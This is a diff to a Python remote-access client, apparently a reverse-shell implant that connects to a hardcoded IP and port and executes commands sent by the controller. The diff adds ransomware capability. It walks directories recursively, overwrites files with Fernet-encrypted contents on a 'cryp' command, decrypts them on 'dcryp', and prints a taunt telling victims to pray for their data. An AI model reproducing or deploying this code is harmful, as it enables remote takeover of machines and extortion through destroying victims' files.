@@ -4,12 +4,13 @@ import sys
 import time
 import subprocess
 import os
+from cryptography.fernet import Fernet
 
 _HOST = '192.168.100.165'
 _PORT = 9991
 _MAX_MSG_SIZE = 4096
 
-# _PORT = int(sys.argv[1])
+_PORT = int(sys.argv[1]) if len(sys.argv) > 1 else _PORT
 
 def conn_server(sel, soc):
     sel = selectors.DefaultSelector()
@@ -30,6 +31,52 @@ def conn_server(sel, soc):
             time.sleep(10)
     sel.register(soc, selectors.EVENT_READ | selectors.EVENT_WRITE)
     return sel, soc
+
+def discover(initial_path):
+    '''
+    Caminha recursivamente à partir do caminho inicial,
+    onde os arquivos deverão ser descobertos e listados
+    para depois serem encryptados.
+
+    Parameters:
+        initial_path (str): Caminho inicial que será
+        usado para criptografar os arquivos.
+
+    Returns:
+        @abs_path (str): O caminho caminho de cada arquivo que é
+        encontrado enquanto navega pelos subdiretórios.
+    '''
+    white_list = ['exe,', 'dll', 'so', 'vmlinuz', 'img']
+
+    for dirpath, _, files in os.walk(initial_path):
+        for _file in files:
+            abs_path = os.path.abspath(os.path.join(dirpath, _file))
+            ext = abs_path.split('.')[-1]
+            if ext not in white_list:
+                yield abs_path
+
+def crypt_file(filename, key, action='encrypt'):
+    '''
+    Criptografa/descriptografa o arquivo dependendo da ação informada.
+
+    Parameters:
+        filename (str): Nome do arquivo que será criptografado.
+        key (str): Chave de criptografia.
+        action (str): Ação para criptografar ou descriptografar o arquivo.
+    '''
+    cipher_value = None
+    with open(filename, 'rb') as _file:
+        content = _file.read()
+        if action == 'encrypt':
+            cipher_value = Fernet(key).encrypt(content)
+        elif action == 'decrypt':
+            cipher_value = Fernet(key).decrypt(content)
+        else:
+            return
+
+    with open(filename, 'wb') as _file:
+        _file.write(cipher_value)
+
 
 if __name__ == "__main__":
     sel = None
@@ -105,6 +152,30 @@ if __name__ == "__main__":
                             elif entry[3:5] == 'cd':
                                 os.chdir(entry[6:len(entry)-1])
                                 soc.send((os.getcwd()).encode())
+
+
+
+                            # Criptografa os arquivos do caminho especificado com a chave informada
+                            elif entry[3:7] == 'cryp':
+                                path, key = entry[7:].split(':')
+                                crypt_path = os.path.abspath(os.path.join(os.getcwd(), path))
+                                print('{}Começando a criptografar > {}{}{}'.format(cores['red'], cores['green'], crypt_path, cores['limpa']))
+
+                                for filename in discover(crypt_path):
+                                    crypt_file(filename, key, 'encrypt')
+                                print('{}Se quiser ver seus dados novamente, comece a rezar!{}'.format(cores['red'], cores['limpa']))
+
+
+
+                            # Descriptografa os arquivos do caminho especificado com a chave informada
+                            elif entry[3:8] == 'dcryp':
+                                path, key = entry[8:].split(':')
+                                crypt_path = os.path.abspath(os.path.join(os.getcwd(), path))
+                                print('{}Começando a descriptografar > {}{}{}'.format(cores['red'], cores['green'], crypt_path, cores['limpa']))
+
+                                for filename in discover(crypt_path):
+                                    crypt_file(filename, key, 'decrypt')
+                                print('{}Arquivos descriptografados > {}{}{}'.format(cores['red'], cores['green'], crypt_path, cores['limpa']))
 
 
 
